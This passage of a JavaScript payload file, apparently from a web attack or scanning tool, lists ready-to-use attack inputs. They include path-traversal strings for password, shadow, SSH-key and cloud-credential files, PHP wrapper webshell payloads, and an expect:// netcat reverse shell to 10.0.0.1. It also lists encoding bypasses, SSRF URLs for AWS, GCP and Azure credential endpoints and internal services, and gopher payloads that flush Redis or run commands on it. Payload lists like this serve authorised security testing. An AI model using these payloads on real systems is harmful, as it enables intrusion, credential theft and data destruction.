  { name: "etc shadow null", payload: "../../../../etc/shadow%00", tag: "linux" },
  { name: "etc group", payload: "../../../../etc/group", tag: "linux" },
  { name: "etc gshadow", payload: "../../../../etc/gshadow", tag: "linux" },
  { name: "etc passwd-", payload: "../../../../etc/passwd-", tag: "linux" },
  { name: "etc shadow-", payload: "../../../../etc/shadow-", tag: "linux" },
  { name: "etc group-", payload: "../../../../etc/group-", tag: "linux" },
  { name: "etc gshadow-", payload: "../../../../etc/gshadow-", tag: "linux" },
  { name: "etc issue", payload: "../../../../etc/issue", tag: "linux" },
  { name: "etc issue.net", payload: "../../../../etc/issue.net", tag: "linux" },
  { name: "etc hosts", payload: "../../../../etc/hosts", tag: "linux" },
  { name: "etc hostname", payload: "../../../../etc/hostname", tag: "linux" },
  { name: "etc resolv.conf", payload: "../../../../etc/resolv.conf", tag: "linux" },
  { name: "etc nsswitch.conf", payload: "../../../../etc/nsswitch.conf", tag: "linux" },
  { name: "etc sudoers", payload: "../../../../etc/sudoers", tag: "linux" },
  { name: "etc crontab", payload: "../../../../etc/crontab", tag: "linux" },
  { name: "etc fstab", payload: "../../../../etc/fstab", tag: "linux" },
  { name: "etc services", payload: "../../../../etc/services", tag: "linux" },
  { name: "etc protocols", payload: "../../../../etc/protocols", tag: "linux" },
  { name: "etc network interfaces", payload: "../../../../etc/network/interfaces", tag: "linux" },
  { name: "etc hosts allow", payload: "../../../../etc/hosts.allow", tag: "linux" },
  { name: "etc hosts deny", payload: "../../../../etc/hosts.deny", tag: "linux" },

  // ----- /proc files -----
  { name: "proc self environ", payload: "../../../../proc/self/environ", tag: "linux" },
  { name: "proc self cmdline", payload: "../../../../proc/self/cmdline", tag: "linux" },
  { name: "proc self status", payload: "../../../../proc/self/status", tag: "linux" },
  { name: "proc self mounts", payload: "../../../../proc/self/mounts", tag: "linux" },
  { name: "proc self fd 0", payload: "../../../../proc/self/fd/0", tag: "linux" },
  { name: "proc self fd 1", payload: "../../../../proc/self/fd/1", tag: "linux" },
  { name: "proc self fd 2", payload: "../../../../proc/self/fd/2", tag: "linux" },
  { name: "proc self fd 3", payload: "../../../../proc/self/fd/3", tag: "linux" },
  { name: "proc self fd 10", payload: "../../../../proc/self/fd/10", tag: "linux" },
  { name: "proc self fd 20", payload: "../../../../proc/self/fd/20", tag: "linux" },
  { name: "proc self fd 50", payload: "../../../../proc/self/fd/50", tag: "linux" },
  { name: "proc self fd 100", payload: "../../../../proc/self/fd/100", tag: "linux" },
  { name: "proc net arp", payload: "../../../../proc/net/arp", tag: "linux" },
  { name: "proc net tcp", payload: "../../../../proc/net/tcp", tag: "linux" },
  { name: "proc net udp", payload: "../../../../proc/net/udp", tag: "linux" },
  { name: "proc net route", payload: "../../../../proc/net/route", tag: "linux" },
  { name: "proc cpuinfo", payload: "../../../../proc/cpuinfo", tag: "linux" },
  { name: "proc meminfo", payload: "../../../../proc/meminfo", tag: "linux" },
  { name: "proc version", payload: "../../../../proc/version", tag: "linux" },
  { name: "proc uptime", payload: "../../../../proc/uptime", tag: "linux" },
  { name: "proc loadavg", payload: "../../../../proc/loadavg", tag: "linux" },
  { name: "proc sys kernel hostname", payload: "../../../../proc/sys/kernel/hostname", tag: "linux" },

  // ----- Log files -----
  { name: "var log auth", payload: "../../../../var/log/auth.log", tag: "linux" },
  { name: "var log secure", payload: "../../../../var/log/secure", tag: "linux" },
  { name: "var log syslog", payload: "../../../../var/log/syslog", tag: "linux" },
  { name: "var log messages", payload: "../../../../var/log/messages", tag: "linux" },
  { name: "var log apache access", payload: "../../../../var/log/apache2/access.log", tag: "linux" },
  { name: "var log apache error", payload: "../../../../var/log/apache2/error.log", tag: "linux" },
  { name: "var log nginx access", payload: "../../../../var/log/nginx/access.log", tag: "linux" },
  { name: "var log nginx error", payload: "../../../../var/log/nginx/error.log", tag: "linux" },
  { name: "var log mail", payload: "../../../../var/log/mail.log", tag: "linux" },
  { name: "var log cron", payload: "../../../../var/log/cron.log", tag: "linux" },
  { name: "var log boot", payload: "../../../../var/log/boot.log", tag: "linux" },
  { name: "var log dmesg", payload: "../../../../var/log/dmesg", tag: "linux" },
  { name: "var log faillog", payload: "../../../../var/log/faillog", tag: "linux" },
  { name: "var log lastlog", payload: "../../../../var/log/lastlog", tag: "linux" },

  // ----- Application configs & user files -----
  { name: "etc php ini", payload: "../../../../etc/php.ini", tag: "linux" },
  { name: "etc php apache", payload: "../../../../etc/php/apache2/php.ini", tag: "linux" },
  { name: "etc php cli", payload: "../../../../etc/php/cli/php.ini", tag: "linux" },
  { name: "etc my.cnf", payload: "../../../../etc/my.cnf", tag: "linux" },
  { name: "etc mysql my", payload: "../../../../etc/mysql/my.cnf", tag: "linux" },
  { name: "etc apache2 conf", payload: "../../../../etc/apache2/apache2.conf", tag: "linux" },
  { name: "etc apache2 sites", payload: "../../../../etc/apache2/sites-enabled/000-default.conf", tag: "linux" },
  { name: "etc nginx conf", payload: "../../../../etc/nginx/nginx.conf", tag: "linux" },
  { name: "etc nginx sites", payload: "../../../../etc/nginx/sites-enabled/default", tag: "linux" },
  { name: "etc ssh config", payload: "../../../../etc/ssh/sshd_config", tag: "linux" },
  { name: "root ssh auth keys", payload: "../../../../root/.ssh/authorized_keys", tag: "linux" },
  { name: "root bash hist", payload: "../../../../root/.bash_history", tag: "linux" },
  { name: "home user bash hist", payload: "../../../../home/user/.bash_history", tag: "linux" },
  { name: "home user profile", payload: "../../../../home/user/.profile", tag: "linux" },
  { name: "home user bashrc", payload: "../../../../home/user/.bashrc", tag: "linux" },
  { name: "home user ssh id_rsa", payload: "../../../../home/user/.ssh/id_rsa", tag: "linux" },
  { name: "root profile", payload: "../../../../root/.profile", tag: "linux" },
  { name: "root bashrc", payload: "../../../../root/.bashrc", tag: "linux" },

  // ==================== WINDOWS LFI ====================
  { name: "win boot ini", payload: "..\\..\\..\\..\\boot.ini", tag: "windows" },
  { name: "win boot ini null", payload: "..\\..\\..\\..\\boot.ini%00", tag: "windows" },
  { name: "win boot ini double", payload: "....\\....\\....\\boot.ini", tag: "windows" },
  { name: "win winini", payload: "..\\..\\..\\..\\windows\\win.ini", tag: "windows" },
  { name: "win system ini", payload: "..\\..\\..\\..\\windows\\system.ini", tag: "windows" },
  { name: "win hosts", payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", tag: "windows" },
  { name: "win hosts null", payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00", tag: "windows" },
  { name: "win sysprep", payload: "..\\..\\..\\..\\windows\\system32\\sysprep\\sysprep.inf", tag: "windows" },
  { name: "win iis metabase", payload: "..\\..\\..\\..\\windows\\system32\\inetsrv\\MetaBase.xml", tag: "windows" },
  { name: "win sam", payload: "..\\..\\..\\..\\windows\\system32\\config\\SAM", tag: "windows" },
  { name: "win security", payload: "..\\..\\..\\..\\windows\\system32\\config\\SECURITY", tag: "windows" },
  { name: "win software", payload: "..\\..\\..\\..\\windows\\system32\\config\\SOFTWARE", tag: "windows" },
  { name: "win system", payload: "..\\..\\..\\..\\windows\\system32\\config\\SYSTEM", tag: "windows" },
  { name: "win iis log", payload: "..\\..\\..\\..\\windows\\system32\\LogFiles\\W3SVC1\\ex.log", tag: "windows" },
  { name: "win apache logs", payload: "..\\..\\..\\..\\Apache\\logs\\access.log", tag: "windows" },
  { name: "win php ini", payload: "..\\..\\..\\..\\windows\\php.ini", tag: "windows" },
  { name: "win my ini", payload: "..\\..\\..\\..\\mysql\\my.ini", tag: "windows" },

  // ==================== PHP WRAPPERS (LFI reading) ====================
  { name: "php wrapper base64", payload: "php://filter/convert.base64-encode/resource=index.php", tag: "wrapper" },
  { name: "php wrapper base64 etc", payload: "php://filter/convert.base64-encode/resource=../../../../etc/passwd", tag: "wrapper" },
  { name: "php wrapper rot13", payload: "php://filter/read=string.rot13/resource=index.php", tag: "wrapper" },
  { name: "php wrapper iconv utf", payload: "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php", tag: "wrapper" },
  { name: "php wrapper iconv base64", payload: "php://filter/convert.iconv.UTF-8.UTF-16|convert.base64-encode/resource=index.php", tag: "wrapper" },
  { name: "php wrapper zlib", payload: "php://filter/zlib.deflate/resource=index.php", tag: "wrapper" },
  { name: "php wrapper gzip", payload: "php://filter/zlib.inflate/resource=index.php", tag: "wrapper" },
  { name: "php wrapper chain decode", payload: "php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=", tag: "wrapper" },

  // ==================== PHP WRAPPERS (RFI / RCE code execution) ====================
  { name: "rfi data wrapper base64", payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", tag: "rfi_wrapper" },
  { name: "rfi data wrapper plain", payload: "data://text/plain,<?php system($_GET['c']); ?>", tag: "rfi_wrapper" },
  { name: "rfi data wrapper urlenc", payload: "data://text/plain,%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E", tag: "rfi_wrapper" },
  { name: "rfi data wrapper null", payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg%3d%3d", tag: "rfi_wrapper" },
  { name: "rfi data with ? bypass", payload: "data://text/plain,<?php system($_GET['c']); ?>?anything=", tag: "rfi_wrapper" },
  { name: "rfi expect id", payload: "expect://id", tag: "rfi_wrapper" },
  { name: "rfi expect whoami", payload: "expect://whoami", tag: "rfi_wrapper" },
  { name: "rfi expect ls", payload: "expect://ls -la", tag: "rfi_wrapper" },
  { name: "rfi expect reverse", payload: "expect://nc -e /bin/sh 10.0.0.1 4444", tag: "rfi_wrapper" },
  { name: "rfi expect null", payload: "expect://id%00", tag: "rfi_wrapper" },
  { name: "rfi php input", payload: "php://input", tag: "rfi_wrapper" },
  { name: "rfi php input null", payload: "php://input%00", tag: "rfi_wrapper" },

 
  // ==================== LOG POISONING ====================
  { name: "log_poison apache access", payload: "../../../../var/log/apache2/access.log", tag: "log_poison" },
  { name: "log_poison apache error", payload: "../../../../var/log/apache2/error.log", tag: "log_poison" },
  { name: "log_poison nginx access", payload: "../../../../var/log/nginx/access.log", tag: "log_poison" },
  { name: "log_poison nginx error", payload: "../../../../var/log/nginx/error.log", tag: "log_poison" },
  { name: "log_poison ssh auth", payload: "../../../../var/log/auth.log", tag: "log_poison" },
  { name: "log_poison mail", payload: "../../../../var/log/mail.log", tag: "log_poison" },
  { name: "log_poison vsftpd", payload: "../../../../var/log/vsftpd.log", tag: "log_poison" },
  { name: "log_poison proftpd", payload: "../../../../var/log/proftpd.log", tag: "log_poison" },
  { name: "log_poison syslog", payload: "../../../../var/log/syslog", tag: "log_poison" },

  // ==================== SESSION FILES ====================
  { name: "session php default", payload: "../../../../var/lib/php/sessions/sess_", tag: "session" },
  { name: "session php tmp", payload: "../../../../tmp/sess_", tag: "session" },
  { name: "session php custom", payload: "../../../../var/lib/php/sessions/sess_${PHPSESSID}", tag: "session" },

  // ==================== MISCELLANEOUS SENSITIVE FILES ====================
  { name: "misc composer json", payload: "../../../../composer.json", tag: "misc" },
  { name: "misc composer lock", payload: "../../../../composer.lock", tag: "misc" },
  { name: "misc package json", payload: "../../../../package.json", tag: "misc" },
  { name: "misc package lock", payload: "../../../../package-lock.json", tag: "misc" },
  { name: "misc git config", payload: "../../../../.git/config", tag: "misc" },
  { name: "misc git index", payload: "../../../../.git/index", tag: "misc" },
  { name: "misc env file", payload: "../../../../.env", tag: "misc" },
  { name: "misc env production", payload: "../../../../.env.production", tag: "misc" },
  { name: "misc aws creds", payload: "../../../../.aws/credentials", tag: "misc" },
  { name: "misc ssh id_rsa", payload: "../../../../.ssh/id_rsa", tag: "misc" },
  { name: "misc ssh id_rsa pub", payload: "../../../../.ssh/id_rsa.pub", tag: "misc" },
  { name: "misc known hosts", payload: "../../../../.ssh/known_hosts", tag: "misc" },
  { name: "misc bash history", payload: "../../../../.bash_history", tag: "misc" },
  { name: "misc mysql history", payload: "../../../../.mysql_history", tag: "misc" },
  { name: "misc npmrc", payload: "../../../../.npmrc", tag: "misc" },
  { name: "misc docker config", payload: "../../../../.docker/config.json", tag: "misc" },
  { name: "misc kube config", payload: "../../../../.kube/config", tag: "misc" },

  // ==================== ADVANCED BYPASSES ====================
  { name: "bypass null byte encoded", payload: "../../../../etc/passwd%2500", tag: "bypass" },
  { name: "bypass double url encoded", payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", tag: "bypass" },
  { name: "bypass unicode 2f", payload: "..%c0%af..%c0%af..%c0%afetc/passwd", tag: "bypass" },
  { name: "bypass unicode 5c", payload: "..%c0%9c..%c0%9c..%c0%9cwindows\\win.ini", tag: "bypass" },
  { name: "bypass path truncation", payload: "../../../../etc/passwd/././././././././././.", tag: "bypass" },
  { name: "bypass path truncation 2", payload: "../../../../etc/passwd/..;/..;/..;", tag: "bypass" },
  { name: "bypass mixed slashes", payload: "..\\../..\\../..\\../etc/passwd", tag: "bypass" },
  { name: "bypass absolute linux", payload: "/etc/passwd", tag: "bypass" },
  { name: "bypass absolute windows", payload: "C:\\boot.ini", tag: "bypass" }
],

  // ===== SERVER-SIDE REQUEST FORGERY =====
SSRF: [
    // =================== LOCALHOST (STANDARD) ===================
    { name: "IPv4 localhost", payload: "http://127.0.0.1", tag: "local" },
    { name: "IPv4 localhost port 80", payload: "http://127.0.0.1:80", tag: "local" },
    { name: "DNS localhost", payload: "http://localhost", tag: "local" },
    { name: "DNS localhost alt", payload: "http://localhost.localdomain", tag: "local" },
    { name: "DNS localhost6", payload: "http://localhost6", tag: "local" },
    { name: "IPv6 loopback full", payload: "http://[::1]", tag: "local" },
    { name: "IPv6 loopback alt", payload: "http://[0:0:0:0:0:0:0:1]", tag: "local" },
    { name: "IPv6 mapped IPv4", payload: "http://[::ffff:127.0.0.1]", tag: "local" },

    // =================== IP OBFUSCATION (INTEGER/OCTAL/HEX) ===================
    { name: "Decimal integer (big-endian)", payload: "http://2130706433", tag: "bypass-ip" },
    { name: "Decimal integer (short 127.1)", payload: "http://127.1", tag: "bypass-ip" },
    { name: "Decimal integer (short 127.0.1)", payload: "http://127.0.1", tag: "bypass-ip" },
    { name: "Hex integer", payload: "http://0x7f000001", tag: "bypass-ip" },
    { name: "Hex with lowercase x", payload: "http://0x7f.0x0.0x0.0x1", tag: "bypass-ip" },
    { name: "Octal integer (full)", payload: "http://0177.0000.0000.0001", tag: "bypass-ip" },
    { name: "Octal integer (mixed)", payload: "http://0177.0.0.1", tag: "bypass-ip" },
    { name: "Mixed hex and octal", payload: "http://0x7f.000.0.1", tag: "bypass-ip" },
    { name: "Leading zeros bypass", payload: "http://127.000.000.001", tag: "bypass-ip" },
    { name: "Zero shorthand (0 = 0.0.0.0, sometimes loops)", payload: "http://0", tag: "bypass-ip" },
    { name: "Zero dotted", payload: "http://0.0.0.0", tag: "bypass-ip" },
    { name: "127.0.0.0 bypass", payload: "http://127.0.0.0", tag: "bypass-ip" },
    { name: "127.0.0.255 bypass", payload: "http://127.0.0.255", tag: "bypass-ip" },
    { name: "Non-standard dotted decimal", payload: "http://127.1.2.3", tag: "bypass-ip" },

    // =================== IP OBFUSCATION (IPv6 EMBEDDED) ===================
    { name: "IPv4-mapped IPv6 (decimal)", payload: "http://[::ffff:2130706433]", tag: "bypass-ip" },
    { name: "IPv4-mapped IPv6 (hex)", payload: "http://[::ffff:7f00:1]", tag: "bypass-ip" },
    { name: "IPv4-compatible IPv6", payload: "http://[::127.0.0.1]", tag: "bypass-ip" },
    { name: "IPv6 long form", payload: "http://[0000:0000:0000:0000:0000:ffff:7f00:0001]", tag: "bypass-ip" },
    { name: "IPv6 zone index", payload: "http://[::1%lo0]", tag: "bypass-ip" },

    // =================== DNS WILDCARD & REBINDING ===================
    { name: "nip.io wildcard", payload: "http://127.0.0.1.nip.io", tag: "bypass-dns" },
    { name: "nip.io with port", payload: "http://127.0.0.1.nip.io:8080", tag: "bypass-dns" },
    { name: "sslip.io wildcard", payload: "http://127.0.0.1.sslip.io", tag: "bypass-dns" },
    { name: "xip.io wildcard", payload: "http://127.0.0.1.xip.io", tag: "bypass-dns" },
    { name: "lvh.me (points to 127.0.0.1)", payload: "http://lvh.me", tag: "bypass-dns" },
    { name: "localtest.me (points to 127.0.0.1)", payload: "http://localtest.me", tag: "bypass-dns" },
    { name: "vcap.me (points to 127.0.0.1)", payload: "http://vcap.me", tag: "bypass-dns" },
    { name: "fuf.me (points to 127.0.0.1)", payload: "http://fuf.me", tag: "bypass-dns" },
    { name: "DNS localhost with trailing dot", payload: "http://localhost.", tag: "bypass-dns" },

    // =================== URL PARSER ANOMALIES (@, #, ?, \, %) ===================
    { name: "Credentials @ bypass", payload: "http://evil.com@127.0.0.1", tag: "bypass-url" },
    { name: "Credentials @ URL-encoded", payload: "http://evil.com%40@127.0.0.1", tag: "bypass-url" },
    { name: "Fragment # bypass", payload: "http://127.0.0.1#@evil.com/", tag: "bypass-url" },
    { name: "Query ? bypass", payload: "http://127.0.0.1?@evil.com/", tag: "bypass-url" },
    { name: "Trailing dot FQDN", payload: "http://127.0.0.1.", tag: "bypass-url" },
    { name: "Double dot", payload: "http://127.0.0.1..evil.com", tag: "bypass-url" },
    { name: "Backslash bypass", payload: "http://127.0.0.1\.evil.com", tag: "bypass-url" },
    { name: "Port 0 bypass", payload: "http://127.0.0.1:0", tag: "bypass-url" },
    { name: "Encoded dot (period)", payload: "http://127%2e0%2e0%2e1", tag: "bypass-url" },
    { name: "Double-encoded dot", payload: "http://127%252e0%252e0%252e1", tag: "bypass-url" },
    { name: "Encoded colon", payload: "http://127%2e0%2e0%2e1%3a80", tag: "bypass-url" },
    { name: "Encoded slash", payload: "http://127.0.0.1%2fadmin", tag: "bypass-url" },
    { name: "Encoded hash", payload: "http://127.0.0.1%23@evil.com", tag: "bypass-url" },
    { name: "Tab char in host", payload: "http://127.0.0.1%09.evil.com", tag: "bypass-url" },
    { name: "Newline in host", payload: "http://127.0.0.1%0a.evil.com", tag: "bypass-url" },
    { name: "Multi-slash bypass", payload: "http://127.0.0.1//evil.com", tag: "bypass-url" },
    { name: "Semicolon bypass", payload: "http://127.0.0.1;@evil.com", tag: "bypass-url" },

    // =================== CLOUD: AWS (IMDSv1, v2, ECS) ===================
    { name: "AWS IMDSv1 root", payload: "http://169.254.169.254/latest/meta-data/", tag: "cloud-aws" },
    { name: "AWS IMDSv1 user-data", payload: "http://169.254.169.254/latest/user-data/", tag: "cloud-aws" },
    { name: "AWS IMDSv1 IAM root", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", tag: "cloud-aws" },
    { name: "AWS IMDSv1 IAM admin", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", tag: "cloud-aws" },
    { name: "AWS IMDSv1 IAM role", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name", tag: "cloud-aws" },
    { name: "AWS IMDSv1 instance-id", payload: "http://169.254.169.254/latest/meta-data/instance-id", tag: "cloud-aws" },
    { name: "AWS IMDSv1 public-keys", payload: "http://169.254.169.254/latest/meta-data/public-keys/", tag: "cloud-aws" },
    { name: "AWS IMDSv1 network-macs", payload: "http://169.254.169.254/latest/meta-data/network/interfaces/macs/", tag: "cloud-aws" },
    { name: "AWS IMDSv1 dynamic doc", payload: "http://169.254.169.254/latest/dynamic/instance-identity/document", tag: "cloud-aws" },
    { name: "AWS IMDSv2 token endpoint", payload: "http://169.254.169.254/latest/api/token", tag: "cloud-aws" },
    { name: "AWS ECS metadata", payload: "http://169.254.170.2/v2/metadata", tag: "cloud-aws" },
    { name: "AWS ECS creds", payload: "http://169.254.170.2/creds", tag: "cloud-aws" },
    { name: "AWS EKS kubeconfig", payload: "http://169.254.169.254/latest/meta-data/eks/cluster", tag: "cloud-aws" },

    // =================== CLOUD: GCP (GOOGLE) ===================
    { name: "GCP metadata root", payload: "http://metadata.google.internal/computeMetadata/v1/", tag: "cloud-gcp" },
    { name: "GCP instance", payload: "http://metadata.google.internal/computeMetadata/v1/instance/", tag: "cloud-gcp" },
    { name: "GCP project-id", payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id", tag: "cloud-gcp" },
    { name: "GCP service-accounts", payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", tag: "cloud-gcp" },
    { name: "GCP SSH keys", payload: "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys", tag: "cloud-gcp" },
    { name: "GCP network interfaces", payload: "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/", tag: "cloud-gcp" },
    { name: "GCP attributes", payload: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/", tag: "cloud-gcp" },

    // =================== CLOUD: AZURE ===================
    { name: "Azure instance (latest API)", payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", tag: "cloud-azure" },
    { name: "Azure compute", payload: "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", tag: "cloud-azure" },
    { name: "Azure network", payload: "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01", tag: "cloud-azure" },
    { name: "Azure managed identity", payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", tag: "cloud-azure" },
    { name: "Azure loadbalancer", payload: "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01", tag: "cloud-azure" },

    // =================== CLOUD: ALIBABA, OCI, DO, OPENSTACK, OTHERS ===================
    { name: "Alibaba metadata", payload: "http://100.100.100.200/latest/meta-data/", tag: "cloud-other" },
    { name: "Alibaba instance-id", payload: "http://100.100.100.200/latest/meta-data/instance-id", tag: "cloud-other" },
    { name: "Alibaba region", payload: "http://100.100.100.200/latest/meta-data/region-id", tag: "cloud-other" },
    { name: "Oracle OCI metadata", payload: "http://192.0.0.192/latest/meta-data/", tag: "cloud-other" },
    { name: "Oracle OCI instance", payload: "http://192.0.0.192/latest/instance/", tag: "cloud-other" },
    { name: "DigitalOcean metadata", payload: "http://169.254.169.254/metadata/v1/", tag: "cloud-other" },
    { name: "DO hostname", payload: "http://169.254.169.254/metadata/v1/hostname", tag: "cloud-other" },
    { name: "DO id", payload: "http://169.254.169.254/metadata/v1/id", tag: "cloud-other" },
    { name: "OpenStack metadata", payload: "http://169.254.169.254/openstack/2022-01-01/", tag: "cloud-other" },
    { name: "Vultr metadata", payload: "http://169.254.169.254/v1.json", tag: "cloud-other" },
    { name: "Scaleway metadata", payload: "http://169.254.169.254/conf?format=json", tag: "cloud-other" },
    { name: "Packet.com metadata", payload: "http://metadata.packet.net/2022-02-15/meta-data", tag: "cloud-other" },

    // =================== INTERNAL PRIVATE NETWORKS (RFC1918 + LINK-LOCAL) ===================
    { name: "RFC1918 Class A (10.0.0.0/8)", payload: "http://10.0.0.1", tag: "internal-net" },
    { name: "RFC1918 Class A (10.10.10.1)", payload: "http://10.10.10.1", tag: "internal-net" },
    { name: "RFC1918 Class A (10.255.255.254)", payload: "http://10.255.255.254", tag: "internal-net" },
    { name: "RFC1918 Class B (172.16.0.0/12)", payload: "http://172.16.0.1", tag: "internal-net" },
    { name: "RFC1918 Class B (172.17.0.1)", payload: "http://172.17.0.1", tag: "internal-net" },
    { name: "RFC1918 Class B (172.31.255.254)", payload: "http://172.31.255.254", tag: "internal-net" },
    { name: "RFC1918 Class C (192.168.0.0/16)", payload: "http://192.168.0.1", tag: "internal-net" },
    { name: "RFC1918 Class C (192.168.1.1)", payload: "http://192.168.1.1", tag: "internal-net" },
    { name: "RFC1918 Class C (192.168.100.1)", payload: "http://192.168.100.1", tag: "internal-net" },
    { name: "Link-local generic", payload: "http://169.254.1.1", tag: "internal-net" },
    { name: "Multicast DNS", payload: "http://224.0.0.1", tag: "internal-net" },
    { name: "Reserved multicast", payload: "http://239.255.255.250", tag: "internal-net" },

    // =================== INTERNAL SERVICE PORT SCANNING (K8S, DOCKER, DBs, QUEUES) ===================
    { name: "SSH (22)", payload: "http://127.0.0.1:22", tag: "internal-service" },
    { name: "DNS (53)", payload: "http://127.0.0.1:53", tag: "internal-service" },
    { name: "SMB (445)", payload: "http://127.0.0.1:445", tag: "internal-service" },
    { name: "MSSQL (1433)", payload: "http://127.0.0.1:1433", tag: "internal-service" },
    { name: "Oracle DB (1521)", payload: "http://127.0.0.1:1521", tag: "internal-service" },
    { name: "MySQL (3306)", payload: "http://127.0.0.1:3306", tag: "internal-service" },
    { name: "PostgreSQL (5432)", payload: "http://127.0.0.1:5432", tag: "internal-service" },
    { name: "Redis (6379)", payload: "http://127.0.0.1:6379", tag: "internal-service" },
    { name: "Memcached (11211)", payload: "http://127.0.0.1:11211", tag: "internal-service" },
    { name: "MongoDB (27017)", payload: "http://127.0.0.1:27017", tag: "internal-service" },
    { name: "Cassandra (9042)", payload: "http://127.0.0.1:9042", tag: "internal-service" },
    { name: "ZooKeeper (2181)", payload: "http://127.0.0.1:2181", tag: "internal-service" },
    { name: "Kafka (9092)", payload: "http://127.0.0.1:9092", tag: "internal-service" },
    { name: "InfluxDB (8086)", payload: "http://127.0.0.1:8086", tag: "internal-service" },
    { name: "Elasticsearch (9200)", payload: "http://127.0.0.1:9200", tag: "internal-service" },
    { name: "Elasticsearch nodes", payload: "http://127.0.0.1:9200/_nodes", tag: "internal-service" },
    { name: "Kubernetes API (6443)", payload: "http://127.0.0.1:6443/version", tag: "internal-service" },
    { name: "Kubernetes Kubelet (10250)", payload: "http://127.0.0.1:10250/pods", tag: "internal-service" },
    { name: "Kubernetes etcd (2379)", payload: "http://127.0.0.1:2379", tag: "internal-service" },
    { name: "Docker API (2375)", payload: "http://127.0.0.1:2375/version", tag: "internal-service" },
    { name: "Docker Swarm (2377)", payload: "http://127.0.0.1:2377", tag: "internal-service" },
    { name: "Consul API (8500)", payload: "http://127.0.0.1:8500/v1/agent/self", tag: "internal-service" },
    { name: "Jenkins (8080)", payload: "http://127.0.0.1:8080/script", tag: "internal-service" },
    { name: "Grafana (3000)", payload: "http://127.0.0.1:3000", tag: "internal-service" },
    { name: "Tomcat (8080 manager)", payload: "http://127.0.0.1:8080/manager/html", tag: "internal-service" },
    { name: "Flask / Docker Registry (5000)", payload: "http://127.0.0.1:5000", tag: "internal-service" },
    { name: "Django / Web (8000)", payload: "http://127.0.0.1:8000", tag: "internal-service" },
    { name: "PHP-FPM (9000)", payload: "http://127.0.0.1:9000", tag: "internal-service" },
    { name: "SMTP (25)", payload: "http://127.0.0.1:25", tag: "internal-service" },
    { name: "RDP (3389)", payload: "http://127.0.0.1:3389", tag: "internal-service" },

    // =================== FILE PATH READS (LINUX, WINDOWS, PROCFS) ===================
    { name: "Linux /etc/passwd", payload: "file:///etc/passwd", tag: "file-read" },
    { name: "Linux /etc/shadow", payload: "file:///etc/shadow", tag: "file-read" },
    { name: "Linux /etc/hosts", payload: "file:///etc/hosts", tag: "file-read" },
    { name: "Linux /etc/issue", payload: "file:///etc/issue", tag: "file-read" },
    { name: "Linux /etc/profile", payload: "file:///etc/profile", tag: "file-read" },
    { name: "Linux /root/.bash_history", payload: "file:///root/.bash_history", tag: "file-read" },
    { name: "Linux /root/.ssh/id_rsa", payload: "file:///root/.ssh/id_rsa", tag: "file-read" },
    { name: "Linux /root/.aws/credentials", payload: "file:///root/.aws/credentials", tag: "file-read" },
    { name: "Linux /proc/self/environ", payload: "file:///proc/self/environ", tag: "file-read" },
    { name: "Linux /proc/self/cmdline", payload: "file:///proc/self/cmdline", tag: "file-read" },
    { name: "Linux /proc/net/fib_trie", payload: "file:///proc/net/fib_trie", tag: "file-read" },
    { name: "Linux /proc/net/tcp", payload: "file:///proc/net/tcp", tag: "file-read" },
    { name: "Linux /proc/self/root/etc/passwd", payload: "file:///proc/self/root/etc/passwd", tag: "file-read" },
    { name: "Linux /var/log/auth.log", payload: "file:///var/log/auth.log", tag: "file-read" },
    { name: "Linux /var/log/apache2/access.log", payload: "file:///var/log/apache2/access.log", tag: "file-read" },
    { name: "Linux /var/log/nginx/access.log", payload: "file:///var/log/nginx/access.log", tag: "file-read" },
    { name: "Windows win.ini", payload: "file:///C:/windows/win.ini", tag: "file-read" },
    { name: "Windows boot.ini", payload: "file:///C:/boot.ini", tag: "file-read" },
    { name: "Windows hosts file", payload: "file:///C:/Windows/System32/drivers/etc/hosts", tag: "file-read" },
    { name: "Windows web.config", payload: "file:///C:/inetpub/wwwroot/web.config", tag: "file-read" },
    { name: "Windows SAM (often locked)", payload: "file:///C:/Windows/System32/config/SAM", tag: "file-read" },

    // =================== GOPHER ADVANCED (RCE / SERVICE INTERACTION) ===================
    { name: "Gopher Redis FLUSHALL", payload: "gopher://127.0.0.1:6379/_FLUSHALL", tag: "gopher-rce" },
    { name: "Gopher Redis INFO", payload: "gopher://127.0.0.1:6379/_INFO", tag: "gopher-rce" },
    { name: "Gopher Redis SET payload", payload: "gopher://127.0.0.1:6379/_SET%20mykey%20%22pwned%22", tag: "gopher-rce" },
    { name: "Gopher Redis CONFIG SET (dir)", payload: "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp/", tag: "gopher-rce" },
    { name: "Gopher Redis Lua eval (RCE)", payload: "gopher://127.0.0.1:6379/_EVAL%20%22return%20os.execute('id')\%22%200", tag: "gopher-rce" },
    { name: "Gopher Memcached stats", payload: "gopher://127.0.0.1:11211/_stats", tag: "gopher-rce" },
    { name: "Gopher Memcached set", payload: "gopher://127.0.0.1:11211/_set%20foo%200%200%203%0Abar", tag: "gopher-rce" },
